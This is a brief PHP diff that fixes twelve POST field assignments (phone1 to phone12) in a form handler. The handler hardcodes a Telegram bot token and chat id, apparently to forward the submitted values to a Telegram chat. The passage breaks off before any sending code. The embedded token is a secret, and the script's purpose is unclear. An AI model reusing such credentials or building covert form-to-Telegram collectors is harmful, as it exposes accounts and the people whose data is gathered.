@@ -1,16 +1,16 @@
 <?php
 	$phone1 = $_POST['phone1'];
-	$phone2 = $_POST['phone1'];
-	$phone3 = $_POST['phone1'];
-	$phone4 = $_POST['phone1'];
-	$phone5 = $_POST['phone1'];
-	$phone6 = $_POST['phone1'];
-	$phone7 = $_POST['phone1'];
-	$phone8 = $_POST['phone1'];
-	$phone9 = $_POST['phone1'];
-	$phone10 = $_POST['phone1'];
-	$phone11 = $_POST['phone1'];
-	$phone12 = $_POST['phone1'];
+	$phone2 = $_POST['phone2'];
+	$phone3 = $_POST['phone3'];
+	$phone4 = $_POST['phone4'];
+	$phone5 = $_POST['phone5'];
+	$phone6 = $_POST['phone6'];
+	$phone7 = $_POST['phone7'];
+	$phone8 = $_POST['phone8'];
+	$phone9 = $_POST['phone9'];
+	$phone10 = $_POST['phone10'];
+	$phone11 = $_POST['phone11'];
+	$phone12 = $_POST['phone12'];
 	$token = "2114731147:AAGcdCrntuCEOQ8y6efkiUKzmXPplX2UsqM";
 	$chat_id = "-683439935";
 	$arr = array(
